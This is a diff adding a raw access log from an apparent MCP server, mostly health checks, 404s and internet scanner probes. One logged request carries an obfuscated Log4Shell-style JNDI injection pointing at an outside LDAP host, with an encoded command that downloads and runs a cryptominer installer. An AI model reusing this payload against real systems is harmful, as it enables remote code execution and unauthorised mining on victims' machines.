@@ -1,0 +1,107 @@
+Starting MCP server on port 3000
+INFO:     54.165.97.5:55800 - "GET / HTTP/1.1" 404 Not Found
+INFO:     91.108.236.130:36395 - "GET / HTTP/1.1" 404 Not Found
+INFO:     65.49.1.212:40010 - "GET / HTTP/1.1" 404 Not Found
+INFO:     65.49.1.219:30539 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     138.68.110.165:58676 - "GET / HTTP/1.1" 404 Not Found
+Starting MCP server on port 3000
+Starting MCP server on port 3000
+INFO:     172.210.183.37:53958 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53958 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53958 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53958 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53958 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53959 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53959 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53959 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53970 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53978 - "GET /mcp HTTP/1.1" 406 Not Acceptable
+Starting MCP server on port 3000
+INFO:     172.210.183.37:54018 - "GET /mcp HTTP/1.1" 406 Not Acceptable
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54019 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54020 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54036 - "GET /mcp HTTP/1.1" 406 Not Acceptable
+INFO:     172.210.183.37:54041 - "GET /health HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54055 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54114 - "GET /health HTTP/1.1" 404 Not Found
+Starting MCP server on port 3000
+INFO:     205.210.31.18:51769 - "GET / HTTP/1.0" 404 Not Found
+INFO:     172.210.183.37:54773 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:54774 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:54781 - "GET /api/mcp HTTP/1.1" 406 Not Acceptable
+INFO:     185.247.137.107:34617 - "GET / HTTP/1.1" 404 Not Found
+INFO:     195.184.76.140:52691 - "GET / HTTP/1.1" 404 Not Found
+INFO:     195.184.76.104:57223 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:59834 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:59834 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+Starting MCP server on port 7777
+INFO:     127.0.0.1:50766 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50766 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50767 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50768 - "GET /api/mcp HTTP/1.1" 406 Not Acceptable
+INFO:     127.0.0.1:50768 - "GET /health HTTP/1.1" 200 OK
+Starting MCP server on port 3000
+INFO:     127.0.0.1:50842 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50842 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:50819 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:50819 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:50889 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:51130 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:51130 - "GET /health HTTP/1.1" 200 OK
+INFO:     80.75.212.83:36672 - "GET /t%28%27%24%7B%24%7Benv%3ANaN%3A-j%7Dndi%24%7Benv%3ANaN%3A-%3A%7D%24%7Benv%3ANaN%3A-l%7Ddap%24%7Benv%3ANaN%3A-%3A%7D//31.15.16.252%3A3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg%3D%3D%7D%27%29 HTTP/1.1" 404 Not Found
+INFO:     138.91.107.7:49658 - "GET / HTTP/1.1" 404 Not Found
+INFO:     87.236.176.159:38889 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.165.198.132:54945 - "GET / HTTP/1.1" 404 Not Found
+Starting MCP server on port 3000
+INFO:     147.185.132.120:57904 - "GET / HTTP/1.1" 404 Not Found
+INFO:     147.185.132.126:52089 - "GET / HTTP/1.0" 404 Not Found
+INFO:     206.168.34.212:36582 - "GET / HTTP/1.1" 404 Not Found
+INFO:     206.168.34.212:43006 - "GET / HTTP/1.1" 404 Not Found
+INFO:     206.168.34.212:43020 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     206.168.34.212:43098 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     206.168.34.212:38100 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:53923 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:53923 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55020 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55020 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55030:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55030:0 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55161:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55161:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55161:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55161:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55161:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55161:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55504 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55649 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:55775 - "GET /health HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55780 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.16.0.4:56113 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.16.0.4:56113 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.16.0.4:56114 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.16.0.4:56155 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.16.0.4:56155 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.16.0.4:56161 - "GET /health HTTP/1.1" 200 OK
+INFO:     192.159.99.180:52856 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.16.0.4:57855 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:58284:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:58284:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     103.99.148.13:65396:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     103.99.148.13:65396:0 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.210.183.37:58359:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:58359:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:58359:0 - "GET /health HTTP/1.1" 200 OK
+INFO:     172.210.183.37:58359:0 - "GET /health HTTP/1.1" 200 OK
+Starting MCP server on port 3000
+INFO:     127.0.0.1:50076 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50076 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50077 - "GET /api/mcp HTTP/1.1" 406 Not Acceptable
